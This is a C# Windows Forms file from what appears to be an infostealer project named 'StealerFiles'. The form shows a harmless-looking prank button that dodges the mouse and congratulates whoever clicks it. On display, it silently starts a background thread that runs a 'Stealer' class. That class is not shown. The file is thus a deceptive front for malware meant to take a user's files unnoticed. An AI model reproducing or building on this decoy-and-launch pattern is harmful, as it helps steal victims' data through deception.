using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

namespace StealerFiles
{
    public partial class Form1 : Form
    {
        Thread myThread;
        public Form1()
        {
            InitializeComponent();
            myThread = new Thread(startSteal);
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            myThread.Start();
        }
        private void startSteal()
        {
            Stealer steal = new Stealer();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Молодец =)");
        }

        private void button1_MouseMove(object sender, MouseEventArgs e)
        {
            Random r = new Random();
            button1.Left = r.Next(1, 900);
            button1.Top = r.Next(1,700);
        }
    }
}
